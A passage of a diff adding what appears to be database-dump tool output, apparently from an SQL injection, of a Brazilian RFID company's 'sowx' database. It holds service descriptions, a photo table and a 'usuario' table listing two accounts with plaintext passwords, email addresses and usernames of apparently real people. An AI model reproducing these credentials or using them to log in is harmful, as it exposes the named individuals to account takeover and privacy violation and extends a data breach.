+| NULL     | 16         | Lavanderia Industrial                                            | Maior agilidade e qualidade nos processos de Embarque, Coleta e Entrega.\r\n\r\nCom a utilização de RFID nos Uniformes e Têxteis, os processos de Coleta e Entrega nos clientes ficam mais ágeis e eficientes, pois a contagem e identificação são automáticas.\r\n\r\nO Processo de identificação e contagem no embarque e desembarque, também são automáticos. Saiba o que realmente entrou e saiu do veículo.\r\n\r\nOtimize seus veículos e sua equipe nos processos de coleta e entrega. Com o apoio de um coletor móvel, é possível identificar e contar em segundos todos os uniformes coletados e entregues. Dê maior confiança para o seu cliente.\r\n\r\nTodos os dados são facilmente integráveis com o seu sistema ERP.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          | A           |
+| <blank>  | 17         | Controle de Acesso                                               | Solução em controle de acesso de colaboradores em Empresas e moradores em Condomínios utilizando Tecnologia RFID Ativa e Passiva.\r\n\r\nUtilizamos o que há de mais moderno para controle e rastreabilidade de pessoas, tanto corporativa quanto em condomínios.\r\n\r\nCom a nossa solução você terá em suas mãos, todas as movimentações ocorridas pelos seus colaboradores nas entradas e saídas que você queira monitorar.\r\n\r\nSaiba a data, hora, minuto e segundo que o seu colaborador entrou e saiu de sua empresa.\r\nO nosso sistema registra todas as informações referentes às movimentações de entrada e saída.\r\nSaiba quantas horas o seu funcionário trabalhou de fato, saiba a jornada de trabalho de cada colaborador, que horas ele entrou e saiu da empresa.\r\n\r\nReduza seus custos com assessoria jurídica e indenizações com processos trabalhistas.\r\n\r\nOferecemos solução para controle de acesso com Tecnologia RTLS (Real Time Location System) nas frequências 433Mhz e 2.45GHz utilizando crachás eletrônicos (Active Tags, Tags Ativas, Badge Tag).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | A           |
+| NULL     | 18         | Logística - Gestão de Frotas                                     | A SOWX, empresa especializada em solução de inovação tecnológica, atua com tecnologia RFID no mercado de logística com soluções para gestão de pneus e frotas. \r\n\r\nO iDriving é uma ferramenta de apoio que oferece como benefício às empresas de logística um sistema de controle automotivo de gestão efetiva da frota e individualizada por veículo e operador. \r\n\r\n<iframe src="//www.slideshare.net/slideshow/embed_code/key/MaPlH2jqtCDHsR" width="595" height="485" frameborder="0" marginwidth="0" marginheight="0" scrolling="no" style="border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;" allowfullscreen> </iframe> <div style="margin-bottom:5px"> <strong> <a href="//www.slideshare.net/ClevelandSoares/idriving-soluo-para-gesto-de-risco-e-jornada-de-trabalho" title="iDriving Solução para Gestão de Risco e Jornada de Trabalho" target="_blank">iDriving Solução para Gestão de Risco e Jornada de Trabalho</a> </strong> de <strong><a href="https://www.slideshare.net/ClevelandSoares" target="_blank">Cleveland Soares</a></strong> </div>\r\n\r\nO iDriving gera informações sobre:\r\n- horas de direção contínua do operador\r\n- data e hora da operação, em movimento e de paradas\r\n- coordenadas de latitude e longitude ao longo da operação (GPS)\r\n- telemetria veicular\r\n- alarme de grau de inclinação do veículo\r\n- quilometragem acumulada\r\n- velocidade média e máxima\r\n- total de ultrapassagens\r\n- tempo em movimento e parado\r\n- veículo parado e ou desligado\r\n- gasto total de combustível quando veículo parado, em aquecimento e em movimento\r\n- tempo de viagem com velocidade e quilometragem percorrida acima da permitida\r\n- quantidade de paradas programadas realizadas e não realizadas\r\n- sensor de frenagem bruscas\r\n- sensor de velocidades em aclive e declive\r\n- sensor de distância em relação ao veículo à frente\r\n- distância legal\r\n- acelerações bruscas (grau de risco do motorista e da carreta)\r\n- desgastes das rodovias\r\n- detector de manobras de alto risco (quebra de asa)\r\n- estação meteorológica embarcada \r\n\r\nCom este conjunto, o iDriving gera relatórios objetivos de métricas e indicadores do operador e do desgaste do veículo para predição de manutenção veicular e qualificação dos operadores.\r\n\r\nO principal objetivo e foco específico do iDriving é ser um sistema inovador radical, sem ser invasivo e não desruptivo, de medição da redução dos custos operacionais veiculares, segurança do equipamento e do operador com ganho na maximização de resultados, reduzindo o CUSTO BRASIL por frete. | A           |
++----------+------------+------------------------------------------------------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------------+
+
+Database: sowx
+Table: servicos_fotos
+[7 entries]
++------------+-----------------+--------------+
+| ID_SERVICO | ID_SERVICO_FOTO | DM_PRINCIPAL |
++------------+-----------------+--------------+
+| 1          | 1               | S            |
+| 2          | 2               | S            |
+| 3          | 3               | S            |
+| 13         | 19              | S            |
+| 12         | 20              | S            |
+| 15         | 21              | S            |
+| 14         | 22              | S            |
++------------+-----------------+--------------+
+
+Database: sowx
+Table: usuario
+[2 entries]
++-------------+----------+-------------------------------+------------+
+| oid_usuario | nm_senha | nm_email                      | nm_usuario |
++-------------+----------+-------------------------------+------------+
+| 1           | swx14skb | claudio@interactive-rs.com.br | claudio    |
+| 4           | sx2015   | cleveland.soares@sowx.com.br  | cleveland  |
++-------------+----------+-------------------------------+------------+
+
